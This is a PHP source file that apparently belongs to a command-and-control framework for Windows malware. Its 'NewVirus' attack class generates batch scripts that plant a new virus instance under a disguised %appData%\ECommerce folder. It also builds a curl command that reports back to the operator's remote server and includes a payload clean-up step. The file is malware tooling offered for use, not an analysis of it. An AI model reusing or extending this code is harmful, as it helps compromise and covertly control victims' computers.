<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;

class NewVirus extends AttackBase {
    private string $baseLocation = "%appData%\\ECommerce";
    private string $newVirusId = "";
    private string $user_handle = "";

    public function __construct() {
        parent::__construct();
    }

    public function generateIntercept(): string {
        ob_start(); //@formatter:off ?>
        $attack = $attackFactory->get("<?php echo $this->attack_id; ?>");
        $attack->setExecuted();
        $attack->saveState();
        <?php return ob_get_clean(); //@formatter:on
    }

    public function getBaseLocation(): string {
        return $this->baseLocation;
    }

    public function setBaseLocation(string $baseLocation): void {
        $this->baseLocation = $baseLocation;
    }

    public function getNewVirusId(): string {
        return $this->newVirusId;
    }

    public function setNewVirusId(string $newVirusId): void {
        $this->newVirusId = $newVirusId;
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->newVirusId = $state["newVirusId"];
        $this->baseLocation = $state["baseLocation"];
        $this->user_handle = $state["user_handle"];
    }

    protected function getState(): string {
        $state = [];
        if ($this->newVirusId == "") { // if the new virus id has not been initialized with anything, create a new one
            $virus = $this->virusFactory->new($this->session->get("user_handle"));
            $this->newVirusId = $virus->getVirusId();
            $this->user_handle = $this->session->getCheck("user_handle");
        }
        $state["newVirusId"] = $this->newVirusId;
        $state["baseLocation"] = $this->baseLocation;
        $state["user_handle"] = $this->user_handle;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl -d "" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function generateBatchCode(): string {
        ob_start();
        echo BaseScriptWin::initStandalone($this->newVirusId, $this->user_handle, $this->baseLocation);
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
        echo BaseScriptWin::cleanUpPayload();
        return ob_get_clean();
    }

    public function processExtras(string $resourceIdentifier): void {
    }
}
